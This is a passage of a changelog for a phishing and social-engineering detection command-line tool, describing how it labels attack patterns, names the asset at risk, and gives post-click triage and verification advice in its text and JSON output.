## [1.0.29] — 2026-06-17

### Added
- **Perspective 29: Text attacker objective (`hlse_text_objective`).**
  Socratic question: "URL verdicts show `◉ Attacker's goal:` keyed to the
  impersonated brand — 'crypto theft — seed phrase or wallet drain; transfers
  are irreversible'. Text verdicts name the attack pattern (`▸ Pattern:`) but
  not the specific asset the attacker is trying to take. A BEC victim reads
  'BEC / CEO-fraud wire-transfer' and knows the mechanism, but not that the
  asset at risk is wire-transfer funds with a 72-hour SWIFT recall window. A
  grandparent-scam victim reads 'emergency impersonation scam' but not that
  the asset is cash — unrecoverable once handed to a courier. Without naming
  the specific asset, the advisory gives no triage priority signal. Shouldn't
  text threats ≥ 60 name the specific asset at risk, parallel to the URL
  `◉ Attacker's goal:` line?" New `hlse_text_objective(const TextVerdict *v)`
  (public API) maps each text attack pattern to a concise asset-at-risk
  description emphasising recoverability (BEC → wire-transfer funds, 72-hour
  SWIFT window; ClickFix → system access, machine treated as compromised;
  investment scam → long-term savings, typically unrecoverable; grandparent
  scam → cash withdrawal, unrecoverable once handed to courier; etc.). Returns
  NULL when score < 60 or no recognisable pattern. Displayed as
  `◉ Attacker's goal:` in text output, positioned between `▸ Pattern:` and
  `⚖ Confidence:` to match the URL advisory layout. Added as `"objective"`
  field in JSON text verdicts (score ≥ 60 only). All three text display paths
  updated (stdin, `text` subcommand, default auto-detect). 6 new CLI
  integration tests (304 total). Zero warnings. F1 = 1.000 preserved.

## [1.0.28] — 2026-06-17

### Added
- **Perspective 28: Text signal confidence (`hlse_text_confidence`).**
  Socratic question: "`hlse_confidence_for` gives URL verdicts an `⚖ Confidence:`
  label. Text verdicts have the same epistemic spectrum: a BEC with urgency +
  financial + authority + secrecy all firing concurrently is as corroborated as
  a URL with four independent detectors agreeing. A single-urgency LOG text is as
  fragile as a single-heuristic URL LOG. Without a confidence line, text verdicts
  look uniformly certain. Why should URL get epistemic disclosure and text be
  silent?" New `hlse_text_confidence(const TextVerdict *v, char *out, size_t outsz)`
  (public API) counts distinct base signal families (urgency, financial, authority,
  secrecy, investment, emergency, ClickFix, etc.) — skipping amplifier lines which
  are derived from base signals, not independent evidence — and maps the count to
  the same qualitative labels as `hlse_confidence_for`: 1 → "single signal —
  corroborate before acting", 2 → "corroborated by N independent signals",
  3+ → "high confidence — N independent signal categories agree; this is a
  multi-tactic social engineering attempt". Displayed as `⚖ Confidence:` in text
  output after `▸ Pattern:`. Added as `"signal_count"` (int) and `"confidence"`
  (string) in JSON text verdicts. 5 new CLI integration tests (298 total).
  Zero warnings. F1 = 1.000 preserved.

## [1.0.27] — 2026-06-17

### Added
- **Perspective 27: Text triage for post-response users (`hlse_text_triage`).**
  Socratic question: "URL verdicts have `⚑ If already clicked:` triage. But BEC,
  tech-support, and grandparent-emergency victims don't click a URL — they REPLY
  to an email, call a phone number, or act on a voice instruction. By the time
  they reach HLSE, the harmful action may already be done. A BEC victim who just
  sent a wire needs to know: 'call your bank's fraud line within 72 hours and
  request SWIFT recall' — not read 'BLOCK [100]'. A tech-support victim who gave
  remote access needs: 'disconnect from the internet immediately'. Shouldn't
  text threats ≥ 60 have the same temporal triage as URL threats?"
  New `hlse_text_triage(const TextVerdict *v)` (public API) calls
  `hlse_classify_text_attack()` and maps the pattern to a specific 60-second
  action: BEC/CEO-fraud → SWIFT recall guidance; ClickFix → disconnect and
  reinstall; tech-support → hang up, revoke remote access; grandparent scam →
  call the family member directly on a known number; ransom → do not pay, report;
  investment scam → stop transfers, contact bank; quishing → check address bar;
  callback/vishing → do not call the number in the message. Displayed as
  `⚑ If you acted:` (distinct from the URL triage label `⚑ If already clicked:`).
  Added as `"triage"` in JSON text verdicts at score ≥ 60. 6 new CLI integration
  tests (293 total). Zero warnings. F1 = 1.000 preserved.

## [1.0.26] — 2026-06-17

### Fixed
- **Stdin pipe mode text advisory consistency.** The `--stdin` pipe mode showed
  `▸ Pattern:` and `↺ Could be benign:` for URL inputs (via `print_url_advisories`)
  but silently omitted both for text inputs. A `LOG [25] "your account is
  suspended"` line in stdin mode showed only the raw reason string with no
  pattern label and no exoneration — while the `text` subcommand and default
  auto-detect paths both showed them. The stdin text branch now builds a
  `TextVerdict` from the `ScanResult`, calls `hlse_classify_text_attack()` for
  the pattern, and calls `hlse_exoneration_for("text", score)` for the benign
  explanation, matching the output of all other text display paths. URL inputs
  in stdin mode now also show the pattern-aware `hlse_url_exoneration()` result.
  Zero warnings. F1 = 1.000 preserved.

## [1.0.25] — 2026-06-17

### Added
- **Perspective 26: Exoneration field in JSON output.**
  The `↺ Could be benign:` explanation is visible in human-readable text output
  for LOG/ALERT verdicts (score 15–59) but was absent from JSON. Library and
  pipeline consumers parsing JSON had no access to this field, forcing them to
  re-implement the benign-explanation logic — or silently omit it from their UI.
  Both `print_json_url()` and `print_json_text()` now emit `"exoneration"`
  when the score is in the LOG/ALERT band [15, 59]. For URL verdicts this uses
  the pattern-aware `hlse_url_exoneration()` (added in Perspective 24). For text
  verdicts this uses `hlse_exoneration_for("text", score)`. The field is absent
  (not `null`) when score ≥ 60 or score = 0. 5 new CLI integration tests (287
  total). Zero warnings. F1 = 1.000 preserved.

## [1.0.24] — 2026-06-17

### Added
- **Perspective 25: Text attack pattern classification (`hlse_classify_text_attack`).**
  Socratic question: "`hlse_classify_url_attack` gives URL verdicts a `▸ Pattern:`
  label ('typosquat credential-harvest', 'authority-trick credential phishing').
  Text verdicts above score 0 show only raw reason strings and a generic
  exoneration. A BEC wire-transfer fraud and a grandparent emergency scam both
  say 'Urgency pressure (N hits)' — but they need entirely different responses:
  BEC requires immediate CFO chain verification; grandparent scam requires
  calling the family member directly. Shouldn't text verdicts also name the
  attack pattern so the response is directed to the right playbook?"
  New `hlse_classify_text_attack(const TextVerdict *v)` (public API) scans
  reason strings for signal names and amplifier labels, then maps them to a
  named tactic in priority order:
  - `ClickFix script-injection lure (paste-and-run attack)`
  - `BEC / CEO-fraud wire-transfer`
  - `business email compromise (BEC) wire-transfer fraud`
  - `tech-support gift-card scam`
  - `lottery / advance-fee fraud`
  - `ransom / extortion message`
  - `investment scam / pig-butchering`
  - `emergency impersonation scam (grandparent / fake-kidnapping)`
  - `QR-code phishing (quishing)`
  - `callback phone scam (TOAD / vishing)`
  - `authority impersonation phishing`
  - `urgency credential-harvest phishing`
  - `urgency social engineering`
  - `credential / payment lure` and others
  Displayed as `▸ Pattern:` in text output. Added as `"pattern"` in JSON text
  verdict. `hlse_core.h` now includes `hlse_text.h` so `TextVerdict` is visible.
  6 new CLI integration tests (282 total). Zero warnings. F1 = 1.000 preserved.

## [1.0.23] — 2026-06-17

### Added
- **Perspective 24: Pattern-aware exoneration (`hlse_url_exoneration`).**
  Socratic question: "`hlse_exoneration_for('url', score)` returns 'heuristic —
  legitimate small businesses also use hyphens and words like secure/login' for
  EVERY LOG/ALERT URL — including URL shorteners (bit.ly), DGA-style domains,
  free-hosting pages, and typosquats. A shortener LOG user reads 'hyphens and
  login words' and is completely confused — their URL has no hyphens. The
  falsifying test ('does the registrable domain belong to the brand?') is
  unanswerable for a shortener because the registrable domain IS the shortener
  (bit.ly). The exoneration isn't just generic — for shorteners it's actively
  wrong. Shouldn't the benign explanation match the actual signal?"
  New `hlse_url_exoneration(const Verdict *v)` (public API) calls
  `hlse_classify_url_attack()` to get the pattern and maps it to a specific
  exoneration:
  - **shortener/obfuscated**: "URL shorteners are standard tools for
    social-media links and marketing; expand with '+' (bit.ly+, tinyurl+) to
    see the destination first"
  - **free-hosting**: "developers legitimately host on GitHub Pages/Netlify;
    search the exact domain to find the owner"
  - **subdomain spoofing**: "read the domain right-to-left — the registrable
    part just before the first '/' must belong to the brand"
  - **typosquat/lookalike**: "typing errors are common; confirm this was the
    intended URL"
  - **DGA/high-entropy**: "search the domain in a search engine — legitimate
    services have traceable history"
  - **high-risk TLD**: "find the brand via bookmark and compare the domain"
  - **@-trick**: "paste into a URL decoder to see where you land"
  - Falls back to the original `hlse_exoneration_for("url", score)` for
    unrecognised patterns. `hlse_exoneration_for()` preserved for compat.
  5 new CLI integration tests (276 total). Zero warnings. F1 = 1.000 preserved.

## [1.0.22] — 2026-06-17

### Added
- **Perspective 23: Compound first-response triage for multi-brand co-spoof URLs
  (`hlse_compound_triage`).**
  Socratic question: "`hlse_triage_for()` calls `hlse_attacker_objective()` which
  returns the FIRST brand's objective. For a PayPal+Apple co-spoof attack the
  `⚑ If already clicked:` line says 'call the number on the back of your card' —
  correct for PayPal, but completely silent on Apple ID. Apple ID is the identity
  keystone that can reset every other account the victim owns. In a compound
  attack the user has TWO concurrent incident-response obligations. If they
  prioritise the bank call and miss the Apple ID reset window, the attacker
  still controls the recovery gateway for their entire account ecosystem. Shouldn't
  the triage line cover both?" New `hlse_compound_triage(const Verdict *v, char *out,
  size_t outsz)` (public API) collects both impersonated brands' objective classes,
  maps each to a concise triage imperative via the new static helper
  `triage_imperative()`, and for n_brands >= 2 writes a numbered two-step sequence:
  `"(1) call the number on the back of your card to freeze it…; (2) change that
  email/identity password, revoke all sessions…"`. For n_brands == 1 writes the
  same result as `hlse_triage_for()`. `hlse_triage_for()` preserved for backward
  compat. Both text `⚑ If already clicked:` and JSON `"triage"` field updated.
  8 new CLI integration tests (271 total). Zero warnings. F1 = 1.000 preserved.

## [1.0.21] — 2026-06-17

### Added
- **Perspective 22: Compound safe destination for multi-brand co-spoof URLs
  (`hlse_safe_destinations`).**
  Socratic question: "`hlse_compound_objective` already says 'compound theft —
  paypal (financial) AND apple (identity) both targeted simultaneously' and
  `hlse_cascade_risk` says 'audit BOTH credential classes'. But `→ Safe
  destination:` shows only `https://paypal.com` — leaving the user with no
  navigable address for their Apple account. The compound framing is now
  logically inconsistent: three lines name both brands, one names only one.
  Should both legitimate destinations appear on that line?" New
  `hlse_safe_destinations(const Verdict *v, char *out, size_t outsz)` (public
  API) extends `hlse_safe_destination()` to collect ALL impersonated brand
  domains from the verdict's "Legitimate '<brand>': <domain>" reason strings.
  For n_brands == 1 it writes `"https://<domain>"` identically to the original.
  For n_brands >= 2 it writes `"https://<domain1> and https://<domain2>"` so the
  `→ Safe destination:` line is coherent with `▸ Pattern: multi-brand co-spoof`,
  `◉ Attacker's goal: compound theft — …`, and `⊕ Also change: two credential
  classes…`. Both text output and JSON `"safe_url"` field use
  `hlse_safe_destinations()`; the original `hlse_safe_destination()` is preserved
  for library backward compat. 8 new CLI integration tests (263 total). Pure
  output — no scoring change, F1 = 1.000 preserved; zero warnings.

## [1.0.20] — 2026-06-17

### Added
- **Perspective 21: Detection confidence / corroboration count (`hlse_confidence_for`).**
  Socratic question: "Your score says HOW threatening, but two verdicts both
  scoring 60 can be epistemically worlds apart: one from a single homoglyph
  detector barely crossing threshold, another from homoglyph + path + TLD +
  structure all agreeing. The first might be a fragile-heuristic false positive;
  the second is corroborated by four independent detectors. A SOC analyst
  triaging a borderline score has no way to tell which they're looking at.
  Shouldn't the output disclose how many independent signals concur?" New
  `hlse_confidence_for(const Verdict *v, char *out, size_t outsz)` (public API)
  counts DISTINCT detector families — collapsing reasons from the same technique
  (e.g. "Brand homoglyph" + "Multiple confusable chars" → one family) and
  excluding the derived "Legitimate '<brand>'" canonical evidence lines — then
  maps the count to a qualitative label: 1 → "single signal — corroborate
  independently before acting on a borderline score"; 2 → "corroborated by N
  independent signals"; 3+ → "high confidence — N independent detector families
  agree; this is a deliberate, multi-faceted spoof". Returns the family count.
  This is the epistemic complement to the score: magnitude vs. evidentiary
  weight. Displayed as `⚖ Confidence:` directly after `▸ Pattern:` in text;
  added as `"signal_count"` (integer) and `"confidence"` (label) in JSON — both
  machine-usable for SOC triage rules ("auto-close single-signal ALERTs",
  "page on-call for 4+ signal ISOLATEs"). 7 new CLI integration tests (255
  total). Pure output — no scoring change, F1 = 1.000 preserved; zero warnings.

## [1.0.19] — 2026-06-16

### Added
- **Perspective 20: ASCII lookalike character diff (`hlse_ascii_diff`).**
  Socratic question: "You report 'paypa1' vs 'paypal' as a homoglyph and your
  own verify guidance says 'compare the address bar character by character' —
  without saying WHICH character. In a proportional-font browser, digit '1' and
  letter 'l' are visually indistinguishable. What if you pointed to EXACTLY
  which position is the impostor: 'char 6 is digit 1, masking letter l'? That
  turns 'edit distance 1' from an abstract metric into proof the user can
  physically verify in their address bar right now." New `hlse_ascii_diff(const
  Verdict *v, char *out, size_t outsz)` (public API, caller-owned buffer) parses
  `"Brand homoglyph: 'X' -> 'Y'"` and `"Typosquat: 'X' is edit distance N from
  'Y'"` reasons, aligns the two strings character by character, and reports every
  differing position with its character type (digit/letter/hyphen). For single
  substitutions: `"'paypa1.com': char 6 is digit '1', masking letter 'l'"`. For
  multiple (e.g., `g00gle`): `"'g00gle.com': char 2 digit '0'→'o', char 3 digit
  '0'→'o'"`. Deliberately skips reasons where the fake string contains non-ASCII
  bytes — those are covered by `hlse_confusable_report()` with richer Unicode
  context. Displayed as `⌖ ASCII lookalike:` after `⌖ Disguised char:` in text
  output; added as `"ascii_diff"` field in JSON. 8 new CLI integration tests
  (248 total). F1 = 1.000 preserved; zero warnings.

## [1.0.18] — 2026-06-16

### Added
- **Perspective 19: Compound objective for multi-brand co-spoof (`hlse_compound_objective`).**
  Socratic question: "`hlse_attacker_objective()` names the primary target precisely
  — but for multi-brand co-spoof URLs (Perspective 17) it returns only the FIRST
  brand's objective. A user phished for PayPal AND Apple ID simultaneously faces
  two compromised credential classes, not one. The `◉ Attacker's goal` line showed
  'financial-account takeover', leaving Apple ID's identity-credential risk
  completely unnamed. The second objective isn't redundant noise — it determines
  what the user must protect next." New `hlse_compound_objective(const Verdict *v,
  char *out, size_t outsz)` (public API, caller-owned buffer): for single-brand URLs
  writes the same full descriptive objective as `hlse_attacker_objective()`; for
  multi-brand co-spoof writes "compound theft — paypal (financial) AND apple
  (identity) both targeted simultaneously in a single click". The three advisory
  lines for co-spoof URLs now form a coherent compound narrative: `▸ Pattern:
  multi-brand co-spoof`, `◉ Attacker's goal: compound theft — paypal (financial)
  AND apple (identity)`, `⊕ Also change: two credential classes...`. `print_url_
  advisories()` and `print_json_url()` both updated to use the new function.
  Also added `brand_objective_class()` static helper (one-word category label:
  "financial", "crypto", "identity", "corporate", etc.) used to build the terse
  compound summary. 7 new CLI integration tests (240 total). F1 = 1.000 preserved;
  zero warnings.

## [1.0.17] — 2026-06-16

### Added
- **Perspective 18: Password-reuse cascade risk (`hlse_cascade_risk`).**
  Socratic question: "You've named the primary target and given triage guidance
  for that account. But credential-stuffing bots test stolen logins against
  hundreds of services within minutes — and 65 % of users reuse passwords. If
  the victim's PayPal password also protects their Gmail, the attacker now
  controls the recovery address for every other account. Shouldn't post-click
  guidance name the accounts most likely to fall in a cascade, not just the one
  they were phished for?" New `hlse_cascade_risk(const Verdict *v)` function
  (public API) returns a static string describing which related accounts to audit
  after a credential-harvest click, keyed to the impersonated brand's objective
  class (financial → email+banking+payment apps; identity/email → all accounts
  that use this email for reset; crypto → other exchanges + irreversibility note;
  corporate → IT team + SSO/VPN; etc.). For multi-brand co-spoof URLs
  (Perspective 17) the guidance explicitly names BOTH credential classes as
  simultaneously harvested. Fires only at score ≥ 60 (BLOCK/ISOLATE) — the
  "already clicked" context where cascade damage is possible. Wired into:
  `print_url_advisories()` (all three text output paths via the centralised
  helper), `print_json_url()` as `"cascade_risk"` field, and the `⊕ Also
  change:` advisory line. 8 new CLI integration tests (233 total). F1 = 1.000
  preserved; zero warnings.

## [1.0.16] — 2026-06-16

### Added
- **Perspective 17: multi-brand co-spoof pattern label.**
  Socratic question: "Single-brand detection assumes one attacker wearing one
  mask. But what if the URL simultaneously impersonates two known brands —
  'paypal.apple-secure.com', 'microsoft.apple-support.net'? Presenting as two
  brands at once exploits both user bases; each fragment looks 'almost right' in
  isolation, making the compound deception harder to dismiss. Shouldn't a
  fundamentally different attack label surface this?" `hlse_classify_url_attack()`
  now counts distinct `"Legitimate '…'"` canonical-brand reasons in the verdict.
  When two or more are present, it returns `"multi-brand co-spoof (compound
  impersonation)"` ahead of all single-brand pattern labels (after IDN, which
  describes the disguise mechanism rather than the brand count). Pure output
  addition — no scoring change, F1 = 1.000 preserved. 8 new CLI integration tests.

### Fixed
- **`--from` channel boost now raises the process exit code.** The delivery-
  channel feature (`--from qr/sms/email/dm`) boosted the displayed score and
  action label but left the process exit gate comparing the raw score against
  `g_fail_threshold`. A URL scoring 55 (ALERT, exits 0) with `--from qr`
  (+20 → 75, shown as BLOCK) still exited 0 — inconsistent with what was
  displayed. Both the default single-URL path and the stdin `--stdin` loop now
  compute `eff_gate = raw_score + channel_delta` before the threshold test.
  Verified: `support-helpdesk.info/reset` (score 55) exits 0 without `--from`
  and exits 1 with `--from qr`. 4 new exit-gate tests.

## [1.0.15] — 2026-06-16

### Changed
- **DRY refactor: centralised the per-URL advisory output into one helper.**
  Audit of Perspectives 9–16 found the six synthesis lenses (Pattern,
  Disguised char, Attacker's goal, Safe destination, Verify, Triage) were
  copy-pasted across all three text output sites (stdin / `text` subcommand /
  default auto-detect) — ~13 identical lines each. Every new perspective forced
  an edit to all three in lockstep, a standing drift risk (the three could
  silently diverge). Extracted `print_url_advisories(const char *url, const
  Verdict *)` as the single source of truth; the three sites now call it. No
  behavioural change — output is byte-for-byte identical (verified by two new
  advisory-parity tests asserting the three paths produce the same advisory
  lines). F1 = 1.000 preserved.

### Fixed
- **Hardened `hlse_safe_destination()` buffer guard.** Once the function was no
  longer inlined at every call site (post-refactor), GCC's `-Wformat-truncation`
  correctly observed the `outsz == 0` guard left buffers of size 1..8 unable to
  hold the `"https://"` prefix. Tightened the guard to `outsz < 10` (a usable
  destination needs at least "https://" + one host char + NUL), restoring the
  zero-warning build and making the contract explicit. No caller is affected
  (all pass MAX_URL-sized buffers).
- **Consistency: `text` subcommand OK-path now surfaces canonical
  confirmation.** Perspective 16's `✔ Canonical:` line was wired into the stdin
  and default OK-paths but not the `text` subcommand's, so `hlse_core text
  "https://paypal.com"` lacked the positive-authentication line the other two
  paths emit. Added it for parity.

## [1.0.14] — 2026-06-16

### Added
- **Canonical confirmation — the "positively confirmed safe" lens**
  (NEW-PERSPECTIVE-CANONICAL-CONFIRM). Socratic question: "When you output 'OK'
  for https://paypal.com you're saying 'I found nothing wrong' — absence of
  evidence. But you KNOW paypal.com is the exact canonical PayPal domain — you
  used that fact to detect paypa1.com. For this URL you have POSITIVE evidence
  of legitimacy, not just absence of threat signals. 'This is the authenticated
  PayPal domain confirmed by the HLSE brand registry' is a stronger statement
  than 'I found nothing suspicious.' Why not say that?"  All prior perspectives
  serve the threat path. This closes the other half: every `OK` verdict for a
  URL whose host exactly matches a registered canonical brand domain (from
  `brand_canonical()`) is upgraded from a bare "nothing found" to a positive
  authentication statement.  New `hlse_canonical_confirm(const char *url, char
  *brand_out, size_t)` (public API) extracts the host, strips an optional
  leading `www.`, and checks it against all entries in the BRANDS[] table.
  Fires only at score == 0 (a fake domain never equals the canonical, so a
  genuine threat verdict can never produce a false confirmation). Human output
  gains a `✔ Canonical: confirmed authentic <brand> domain (HLSE brand
  registry)` line between the OK header and the blind-spot note, replacing the
  weaker epistemic "absence of threat" with the stronger "positive match"; JSON
  gains a `"canonical_brand"` field. Non-brand clean URLs and all threat URLs
  emit nothing. Pure output, zero scoring change: F1 = 1.000 preserved. 8 new
  CLI integration tests cover paypal.com, www-prefix stripping (www.zoom.us →
  zoom.us), a non-obvious canonical TLD (zoom.us), the non-brand clean negative,
  the threat-URL negative, JSON field presence/absence, and stdin pipe.

## [1.0.13] — 2026-06-16

### Added
- **Incident triage — the "if you already clicked" lens**
  (NEW-PERSPECTIVE-TRIAGE). Socratic question: "The verdict assumes the user
  saw HLSE's output BEFORE clicking. But people typically notice something's
  wrong AFTER submitting credentials. At that moment 'BLOCK' and a list of
  structural reasons is useless — they need triage: what to do in the next 60
  seconds to minimise damage. Does HLSE serve the post-click user at all?"
  All prior perspectives serve the decision-point (before or during): blind
  spot, exoneration, and verify are pre-click; pattern, objective, and safe
  destination are also pre-action. The post-click user needs an entirely
  different answer. New `hlse_triage_for(const Verdict *)` (public API) emits
  first-response triage keyed to the same brand-objective class as
  `hlse_attacker_objective`, so the guidance matches the specific asset at
  risk: crypto seed phrase → move funds to a new wallet immediately (irrevers-
  ible); financial/banking → call the card-back number to block; identity/email
  → change password and revoke sessions (resets everything); corporate SSO →
  notify IT within minutes (lateral movement window); social → change password
  and warn contacts (next target); telecom → add SIM-lock PIN; AI/API key →
  revoke in provider console; gaming → enable 2FA now. Fires only at score >=
  60 (BLOCK/ISOLATE), so it never fires in the same verdict as exoneration
  (15..59). Human output gains a `⚑ If already clicked: <triage>` line; JSON
  gains a `"triage"` field. Pure output, zero scoring change: F1 = 1.000
  preserved. 9 new CLI integration tests cover payment/corporate/crypto
  categories, the band boundary (absent at ALERT), JSON field presence/absence,
  the clean/text negatives, and stdin pipe.

## [1.0.12] — 2026-06-15

### Added
- **Independent verification — the "how to check me without trusting me" lens**
  (NEW-PERSPECTIVE-VERIFY). Socratic question: "You're a heuristic engine with
  no network, no certificate inspection, no ground truth. A user about to type
  their password is betting on your word alone. What ONE check can they run
  right now — one that doesn't require trusting you — to confirm the verdict
  before they act or report it?"  This is the high-confidence mirror of the
  exoneration lens: `hlse_exoneration_for` serves the LOG/ALERT band (15..59)
  with the benign explanation and a test that *clears* the doubt; the new
  `hlse_verification_for(const Verdict *)` (public API) serves the BLOCK/ISOLATE
  band (>=60) with a test that lets the user *confirm* the threat themselves.
  The two bands are disjoint, so at most one of the two lines ever appears.
  The check is chosen from the signals that fired so it targets the actual
  deception — expand-the-shortener for hidden destinations, read-after-the-'@'
  for authority tricks, bare-IP-is-fake for IP hosts, reach-via-bookmark for
  homoglyph/IDN, read-right-to-left for subdomain/free-host spoofing, and a
  trusted-channel fallback. Human output gains a `✓ Verify independently:
  <check>` line; JSON gains a `"verify"` field. Pure output, zero scoring
  change: F1 = 1.000 preserved. 8 new CLI integration tests assert the BLOCK/
  ALERT band split (verify vs exoneration are mutually exclusive), the clean
  negative, and JSON field presence/absence.

## [1.0.11] — 2026-06-15

### Added
- **Confusable forensics — the "show the disguise" lens**
  (NEW-PERSPECTIVE-CONFUSABLE). Socratic question: "You said 'mixed-script
  homoglyph' and then showed the user the very string their eyes already
  glossed over — `раypal.com` looks identical to `paypal.com`. Which exact
  character is the impostor? Naming it ('position 1 is Cyrillic U+0440, not an
  ASCII letter') turns an abstract label into undeniable, teachable proof a
  browser's address bar actively hides."  The deception in an IDN/mixed-script
  attack lives at the codepoint level, yet every prior reason re-displayed the
  same indistinguishable glyphs.  New `hlse_confusable_report(const char *url,
  char *out, size_t)` (public API) walks the host, decodes the first non-ASCII
  UTF-8 codepoint, and reports its 1-based position, `U+XXXX` value, and
  Unicode script block (Cyrillic, Greek, Armenian, fullwidth, …).  Human output
  gains a `⌖ Disguised char: <detail>` line after the attack-pattern label;
  JSON gains a `"confusable"` field.  Deliberately scoped to raw non-ASCII
  hosts only: pure-ASCII homoglyphs (`g00gle`, `paypa1`) are already spelled
  out in the brand-homoglyph reason, and `xn--` punycode hosts are ASCII and
  covered by the IDN reason — so the lens fires exactly where existing output
  was least informative, with no duplication.  Shown across all three URL paths
  (single-arg, default, `--stdin`).  Pure output, zero scoring change: F1 =
  1.000 preserved.  6 new CLI integration tests cover the Cyrillic case, the
  pure-ASCII and clean negatives, JSON field presence/absence, and stdin pipe.

## [1.0.10] — 2026-06-15

### Added
- **Attacker objective — the "what are they after?" lens**
  (NEW-PERSPECTIVE-OBJECTIVE). Socratic question: "You named HOW the attack
  works (the pattern) and WHERE the user should go instead (safe destination) —
  but never WHAT the attacker is actually after. 'A phishing page' is abstract
  and easy to shrug off; 'they want your crypto seed phrase, and that theft is
  irreversible' names the exact asset the victim must treat as compromised
  right now. Doesn't the stake decide how hard the user should care?"  The same
  `BLOCK [60]` verdict carries wildly different real-world stakes by brand: a
  fake Netflix page risks a stored card, a fake MetaMask page risks an
  irreversible wallet drain, a fake Okta page risks the user's whole employer.
  Where `hlse_classify_url_attack` describes the *mechanism*, the new
  `hlse_attacker_objective(const Verdict *)` (public API) describes the *motive
  and the asset at stake*, derived from which brand was impersonated. Brands
  are bucketed into 12 objective classes (crypto/irreversible, financial,
  password-vault, email-identity keystone, corporate-SSO, social, subscription,
  gaming, delivery-fee, fake-AV, AI/API-key, telecom/SIM-swap) with a generic
  credential-harvest fallback for any other identified brand. Human output gains
  a `◉ Attacker's goal: <objective>` line; JSON gains an `"objective"` field.
  Shown across all three URL paths (single-arg, default, `--stdin`) and only
  when a brand was impersonated — clean URLs and text inputs emit nothing. Pure
  output, zero scoring change: F1 = 1.000 preserved. 8 new CLI integration
  tests cover the crypto/payment/identity classes, JSON field presence/absence,
  stdin pipe, and the clean/text negative paths.

## [1.0.9] — 2026-06-15

### Added
- **Safe destination — the "did-you-mean" lens** (NEW-PERSPECTIVE-SAFE-DEST).
  Socratic question: "You blocked the counterfeit — but the user still has the
  legitimate need that made them click. Saying only 'no' leaves them to
  re-search straight back into the same phishing net. You already know the real
  domain — you used it to detect the fake. Shouldn't you hand it over as a
  navigable destination?"  Detection so far stopped at *naming* the threat;
  it never closed the loop into *guidance toward safety*.  Perspective 8
  already derives the authentic brand domain and records it as the evidence
  reason `Legitimate '<brand>': <domain>` — but that fact sat buried among the
  signals.  New `hlse_safe_destination(const Verdict *, char *out, size_t)`
  (public API) lifts it into an actionable, navigable `https://<domain>` URL.
  Human output gains a prominent `→ Safe destination: https://<domain>` line
  after the attack-pattern label; JSON output gains a `"safe_url"` field.
  Shown across all three URL paths (single-arg, default auto-detect, `--stdin`)
  and only when a brand was actually impersonated — clean URLs and text inputs
  emit nothing, keeping output noise-free.  Pure output, zero scoring change:
  F1 = 1.000 preserved.  8 new CLI integration tests cover the typosquat and
  homoglyph cases, the navigable-URL format, JSON `safe_url` presence/absence,
  stdin pipe, and the clean/text negative paths.

## [1.0.8] — 2026-06-15

### Added
- **Delivery-channel context — the threat-prior lens** (NEW-PERSPECTIVE-CHANNEL).
  Socratic question: "You analysed the URL — but HLSE has no idea how it
  reached you. A QR code in a parking meter and a link you typed yourself
  carry the same bytes yet very different priors. Should the channel change
  the verdict?"  The delivery channel is an independent threat signal that URL
  structure cannot encode.  New `--from email|sms|dm|qr|manual` flag lets
  callers supply this context.  The channel is applied as a score boost on URL
  verdicts (non-URL inputs are unaffected): QR +20 (quishing, destination is
  masked), SMS +15 (primary smishing vector), email +10 (classic phishing),
  DM +10 (social-engineering via messaging), manual ±0 (user typed it).  The
  effective score drives the displayed action tier; the raw score is still
  emitted so consumers can see both.  JSON output gains `"channel"`,
  `"channel_delta"`, `"effective_score"`, and `"effective_action"` fields.
  Human text output emits a `· Channel (<ch>): +N — <rationale>` reason
  bullet after the structural signals.  `--from manual` is the explicit
  opt-in to "no prior" and emits no bullet to keep clean-URL output noise-free.
  12 new CLI integration tests cover each channel, JSON field, stdin pipe,
  text-input passthrough, and the `--from <unknown>` error path.

## [1.0.7] — 2026-06-15

### Fixed
- **`--stdin` pipe mode ignored `--fail-on` (exit gate hardcoded at BLOCK/60).**
  Self-audit of the `--fail-on` feature (1.0.x) found that its claim of "all
  exit sites honour the configurable gate" missed `stdin_mode`, which is the
  *primary* CI batch path. It set `any_threat` on a hardcoded `score >= 60`,
  so `--stdin --fail-on log` (or `alert`) silently passed LOG/ALERT-tier
  findings that the equivalent single-argument invocation would fail on. Now
  uses `g_fail_threshold` like every other exit site. Default behaviour
  (gate at 60) is unchanged. (Required moving the `g_fail_threshold`
  definition above `stdin_mode`.)

### Changed
- **`--stdin` text output now carries the `▸ Pattern:` attack-class label**,
  matching the `--json` pipe output (which already emitted `pattern`) and the
  single-artifact human output. Previously the human-readable batch path was
  the only one missing the synthesized threat class.

## [1.0.6] — 2026-06-15

### Fixed
- **Duplicate canonical-domain reason when multiple brand detectors fire.**
  Self-audit of the 1.0.4 canonical-domain feature: a URL like
  `paypal.evilsite.netlify.app` trips *both* the subdomain-spoof and the
  free-hosting detectors, each of which emitted its own
  `Legitimate 'paypal': paypal.com` line — so the canonical appeared twice,
  reading as a duplicate and consuming two of the verdict's 12 reason slots
  (which can push a real detection signal out of the buffer). Introduced a
  single `add_brand_canonical()` helper that looks up the canonical, skips it
  if an identical reason is already present, and adds it with zero score
  delta. This also removes the copy-pasted `brand_canonical()`/`add_reason()`
  boilerplate from all 14 brand-detection sites (DRY). Behaviour is identical
  for single-detector cases; F1 = 1.000 preserved. New regression test asserts
  exactly one canonical line for a repeated-brand URL.

## [1.0.5] — 2026-06-15

### Added
- **Attack pattern synthesis — the named-threat classification lens**
  (NEW-PERSPECTIVE-PATTERN). Socratic question: "You listed five signals —
  what do they add up to?" HLSE outputs individual detection reasons but
  silently assumed users could synthesize them into a named threat class.
  A new `hlse_classify_url_attack(Verdict *)` function (exposed in the
  public API) scans the fired signals and maps them to a terse attack-class
  label using priority-ordered rules: IDN/Unicode impersonation, visual
  homoglyph, @-authority-trick, IP-hosted brand, free-hosting phishing
  infrastructure, subdomain-spoof, typosquat (with and without a path),
  brand-hyphen, classic credential-harvest, brand+TLD, shortener, DGA.
  The label appears in text output as `▸ Pattern: <class>` after the
  per-signal reasons, and in `--json` output as `"pattern":<string>`.
  Score and F1 are unaffected (classifier is read-only, zero delta).
  7 new integration tests: each major attack class is verified, including
  "clean URL has no Pattern line." 151 total CLI tests, 0 failures.

## [1.0.4] — 2026-06-15

### Added
- **Canonical domain — the contrastive truth lens**
  (NEW-PERSPECTIVE-CANONICAL). Socratic question: "You've named the deception
  — where should I actually go?" Every brand-detection path (typosquat, digraph
  homoglyph, confusable-character, II→ll, mixed-script, IDN homograph, subdomain
  spoofing, brand+security-word hyphenation, brand+suffix-word fusion, brand in
